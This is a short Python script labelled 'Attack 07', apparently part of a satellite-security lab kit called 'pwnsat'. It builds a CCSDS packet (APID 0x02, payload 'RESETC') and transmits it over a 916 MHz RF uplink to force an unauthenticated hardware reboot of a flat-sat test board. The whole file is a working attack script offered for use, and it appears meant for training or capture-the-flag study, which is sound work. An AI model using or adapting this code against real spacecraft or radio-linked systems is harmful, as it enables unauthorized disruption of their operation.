#!/usr/bin/env python3
"""
Attack 07: Unauthenticated RESETC Reboot (RF Variant via Radio 1 RF Uplink)
Transmits RESETC reboot packet (APID 0x02) over 916 MHz RF link over-the-air.
"""
import os
import sys
import time

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../lib")))
from pwnsat_packets import build_ccsds_packet
from pwnsat_rf import FlatSatRF

def main():
    print("[+] Attack 07: Unauthenticated RESETC Hardware Reboot (Over-The-Air RF 916 MHz Variant)")
    rf = FlatSatRF()
    packet = build_ccsds_packet(apid=0x02, payload=b"\x52\x45\x53\x45\x54\x43")
    print("[*] Transmitting unauthenticated RESETC frame over 916.0 MHz uplink...")
    rf.transmit_rf(packet)
    print("[✓] RF RESETC packet transmitted. Hardware rebooting (Red LED).")

if __name__ == "__main__":
    main()
